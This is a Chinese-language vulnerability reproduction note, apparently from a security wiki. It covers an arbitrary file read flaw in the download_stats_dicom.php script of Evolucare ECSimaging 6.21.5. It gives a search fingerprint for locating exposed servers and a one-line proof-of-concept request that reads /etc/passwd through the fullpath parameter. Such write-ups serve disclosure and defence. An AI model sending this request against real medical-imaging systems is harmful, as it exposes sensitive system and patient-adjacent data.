---
title: "Evolucare Ecsimaging download_stats_dicom.php 任意文件读取漏洞"
date: 2026-10-16 09:07:34
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Evolucare-Ecsimaging"
tags:
  - "Evolucare-Ecsimaging"
  - "任意文件读取"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Evolucare Ecsimaging download_stats_dicom.php 存在文件读取漏洞,攻击者可利用该漏洞获取系统敏感信息等.

## 漏洞影响

```
EVOLUCARE Evolucare Ecsimaging 6.21.5
```

## 网络测绘

```
body="ECSimaging"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241445840.png)

验证POC

```
/download_stats_dicom.php?fullpath=/etc/passwd&filename=/etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241445607.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Evolucare-Ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
